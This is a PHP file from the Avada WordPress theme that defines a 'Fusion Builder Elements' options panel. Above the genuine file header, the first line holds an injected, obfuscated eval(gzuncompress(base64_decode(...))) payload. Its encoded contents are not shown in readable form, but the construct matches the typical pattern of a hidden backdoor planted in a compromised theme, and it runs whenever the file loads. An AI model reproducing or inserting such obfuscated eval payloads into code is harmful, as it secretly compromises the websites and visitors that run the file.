<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Avada Options.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      4.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Shortcode-Styling settings
 *
 * @param array $sections An array of our sections.
 * @return array
 */
function fusion_builder_redux_shortcode_styling( $sections ) {

	$option_name = 'fusion_builder_options';

	if ( class_exists( 'FusionBuilder' ) ) {
		$sections['shortcode_styling'] = array(
			'label'    => esc_html__( 'Fusion Builder Elements', 'Avada' ),
			'id'       => 'fusion_builder_elements',
			'is_panel' => true,
			'priority' => 14,
			'icon'     => 'el-icon-cog',
			'fields'   => array(
				'shortcode_styling' => array(
					'label'       => '',
					/* translators: URL. */
					'description' => '<div class="fusion-redux-important-notice">' . sprintf( __( '<strong>IMPORTANT NOTE:</strong> Fusion Builder Elements settigns are moved to Fusion Builder Elements options panel <a href="%s" target="_blank">here</a>.', 'Avada' ), admin_url( 'admin.php?page=fusion-element-options' ) ) . '</div>',
					'id'          => 'shortcode_styling',
					'type'        => 'custom',
					'option_name' => $option_name,
				),
			),
		);
	}

	return $sections;

}
